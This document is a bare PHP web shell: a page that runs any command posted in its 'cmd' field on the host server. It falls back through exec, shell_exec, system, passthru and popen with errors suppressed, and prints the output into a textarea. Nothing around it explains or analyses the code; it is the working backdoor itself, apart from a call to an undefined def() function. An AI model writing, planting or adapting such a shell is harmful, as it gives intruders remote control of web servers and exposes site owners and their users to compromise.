<html>
<body bgcolor="" background="http://wallpapers.wallhaven.cc/wallpapers/full/wallhaven-206444.png" >
<?php
function ex($param) {
	$res = '';
	if (!empty($param)){
		if(function_exists('exec'))	{
			@exec($param,$res);
			$res = join("\n",$res);
		}
		elseif(function_exists('shell_exec'))	{
			$res = @shell_exec($param);
		}
		elseif(function_exists('system'))	{
			@ob_start();
			@system($param);
			$res = @ob_get_contents();
			@ob_end_clean();
		}
		elseif(function_exists('passthru'))	{
			@ob_start();
			@passthru($param);
			$res = @ob_get_contents();
			@ob_end_clean();
		}
		elseif(@is_resource($f = @popen($param,"r")))	{
			$res = "";
			while(!@feof($f)) { $res .= @fread($f,1024); }
			@pclose($f);
		}
	}
	return $res;
}
function wcom ()
{
	$cmd=$_POST['cmd'];
	$result=ex("$cmd");
	echo '<center><br><h3><font color="red"> Run Command </font> </h3></center>
	<center>
	<form method="POST" action="">
	<input type="hidden" name="id" value="cmd" />
	<input type="text" size="85" name="cmd" value="',$cmd,'" class="input" />&nbsp;
	<input type="submit" class="button" value=" Run " />
	</form><br>
	<textarea rows=35 cols=85 class="textarea" style="color:#ff3399; background-color: #000000">',$result,'</textarea><br><br>';
}
?>



<?php
			// swich to function called base on id
			$cmdid = $_GET['id'];
			switch ($cmdid) {
			
				// Command Line
				case 'cmd':
					wcom();
					break;
			
				// Default
				default: def();
			}
			//*******************************************************
			
?>
</body>
</html>
